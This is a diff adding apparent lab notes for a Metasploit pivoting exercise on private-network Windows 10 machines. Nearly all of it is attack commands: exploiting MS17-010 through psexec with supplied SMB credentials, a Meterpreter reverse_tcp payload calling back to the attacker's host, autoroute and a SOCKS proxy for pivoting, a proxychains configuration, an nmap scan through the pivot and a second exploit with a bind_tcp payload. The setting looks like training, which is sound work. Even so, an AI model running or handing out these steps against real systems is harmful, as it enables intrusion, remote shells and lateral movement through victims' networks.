@@ -1,0 +1,60 @@
+
+Windows10(target1) - BA (Bridge-adaptor) - 192.168.0.117
+Windows10(target1) - HA (Host-Only adaptor) - 192.168.205.105
+
+windows10 Clone(target2 clone) - HA (Host-Only adaptor) - 192.168.205.106
+
+terminal1
+msfconsole
+search ms17-010
+use exploit/windows/smb/ms17_010_psexec
+set payload windows/x64/meterpreter/reverse_tcp
+options
+set RHOST 192.168.0.117
+set SMBUSER forensic
+set SMBPASS admin
+set LHOST 192.168.0.139
+set LPORT 6622
+exploit
+Note: Gaining access to target 1
+
+search autoroute
+use post/multi/manage/autoroute
+options
+sessions
+set SESSION 1
+options
+run
+Note: to add routing table 
+route
+
+search socks
+use auxiliary/server/socks_proxy
+options
+run
+jobs
+Note: To enable proxy in msfconsole 
+
+terminal2 
+
+ mousepad /etc/proxychains4.conf 
+in line no 10 remove # for dynamic_chain
+in line no 18 add # #strict_chain
+END OF LINE  
+#socks4 	127.0.0.1 9050
+socks5	127.0.0.1	1080 
+Note:press tab for space 
+ctrl+s  
+
+proxychains nmap -p 139,445 -sT -n -Pn 192.168.205.106
+
+proxychains msfconsole 
+search ms17-010
+use exploit/windows/smb/ms17_010_psexec
+set PAYLOAD windows/x64/meterpreter/bind_tcp
+options
+set RHOST 192.168.205.106
+set SMBUSER forensic
+set SMBPASS admin
+set LPORT 6644
+exploit
